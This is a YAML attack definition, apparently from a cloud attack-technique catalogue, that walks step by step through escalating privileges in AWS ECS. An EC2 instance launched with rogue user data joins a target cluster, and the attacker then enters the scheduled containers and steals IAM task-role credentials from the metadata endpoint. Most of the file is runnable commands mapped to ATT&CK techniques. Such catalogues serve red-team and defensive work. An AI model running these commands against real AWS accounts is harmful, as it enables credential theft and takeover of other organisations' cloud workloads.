attack:
  id: 'aws-ecs-privesc-001'
  name: 'Privilege Escalation to ECS via EC2 Instance Registration'
  overview: |
    This attack leverages EC2 permissions to create a new EC2 instance and register it within an existing ECS cluster. By launching an ECS-optimized AMI with custom user data that configures the ECS agent to join a target cluster, the attacker gains access to the EC2 host. Once the instance is registered, ECS services and tasks will be scheduled on this attacker-controlled instance, allowing the attacker to access running Docker containers and steal IAM roles attached to ECS tasks.
  steps:
    - title: 'Create EC2 Instance with ECS Configuration'
      command: |
        aws ec2 run-instances \
            --image-id ami-07fde2ae86109a2af \
            --instance-type t2.micro \
            --iam-instance-profile <ECS_role> \
            --count 1 --key-name pwned \
            --user-data "file:///tmp/asd.sh"
      dependencies:
        - 'ec2:RunInstances permission'
        - 'iam:PassRole permission for the ECS instance profile'
        - 'Pre-existing SSH key pair (pwned) in the target region'
        - 'ECS-optimized AMI ID (e.g., amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)'
        - 'Knowledge of target ECS cluster name'
      result: |
        A new EC2 instance is launched with the ECS agent configured to register with the target cluster. The attacker has SSH access via the specified key pair.
      ttp: 'T1578.002 - Modify Cloud Compute Infrastructure: Create Cloud Instance'
    - title: 'Configure User Data Script for ECS Cluster Registration'
      command: |
        #!/bin/bash
        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config
        echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config
      dependencies:
        - 'Target ECS cluster name'
        - 'User data script stored at /tmp/asd.sh'
      result: |
        The EC2 instance automatically registers with the specified ECS cluster upon boot, making it available to receive task placements from the ECS scheduler.
      ttp: 'T1059.004 - Command and Scripting Interpreter: Unix Shell'
    - title: 'Access Docker Containers and Steal ECS Task Roles'
      command: |
        # SSH into the compromised EC2 instance
        ssh -i pwned.pem ec2-user@<instance-public-ip>
        
        # List running containers
        docker ps
        
        # Access container and retrieve task role credentials
        docker exec -it <container-id> /bin/sh
        curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
      dependencies:
        - 'SSH access to the EC2 instance'
        - 'ECS tasks scheduled on the compromised instance'
        - 'Docker CLI access on the host'
        - 'ECS tasks with IAM roles attached'
      result: |
        The attacker gains access to running Docker containers and can retrieve temporary IAM credentials from the ECS task metadata endpoint, effectively assuming the IAM roles attached to ECS tasks.
      ttp: 'T1552.005 - Unsecured Credentials: Cloud Instance Metadata API'
  stride_goal:
    - 'Elevation of Privilege'
    - 'Information Disclosure'